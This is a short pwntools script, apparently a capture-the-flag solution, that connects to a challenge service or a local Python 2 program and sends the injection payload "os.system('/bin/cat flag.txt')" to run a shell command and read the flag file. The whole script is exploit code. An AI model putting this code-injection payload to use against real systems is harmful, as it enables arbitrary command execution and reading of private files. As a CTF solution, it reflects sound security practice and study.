from pwn import *

rem = 0

if(rem):
	p = remote("umbccd.io", 4000)
else:
	p = process(["python2",  "source_code.py"])

p.recv()
p.sendline("os.system('/bin/cat flag.txt')")

p.interactive()